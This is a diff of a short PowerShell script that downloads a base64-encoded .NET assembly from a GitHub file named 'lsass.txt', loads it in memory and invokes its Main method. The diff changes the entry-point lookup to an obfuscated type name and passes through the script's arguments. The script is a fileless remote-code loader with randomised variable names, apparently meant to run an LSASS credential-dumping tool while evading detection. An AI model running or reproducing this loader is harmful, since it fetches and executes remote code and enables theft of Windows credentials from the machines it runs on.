@@ -1,5 +1,7 @@
 $asvewfwsdvsdf = (iwr https://raw.githubusercontent.com/br1337/Scripts/main/lsass.txt -usebasicparsing).content
 $bytes = [System.Convert]::FromBase64String($asvewfwsdvsdf)
 $xbdfgerhrtehge = [System.Reflection.Assembly]::Load($bytes)
-$entryPointMethod =  $xbdfgerhrtehge.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static,Public,NonPublic')
-$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
+$h = [Reflection.BindingFlags]"Public,NonPublic,Static"
+$izxcasfqwr = $xbdfgerhrtehge.GetType("lolkekpohek.UHJvZ3JhbUFB",$h)
+$jdsfgwgeg = $izxcasfqwr.GetMethod("Main",$h)
+$jdsfgwgeg.Invoke($null, (, [string[]]$args))
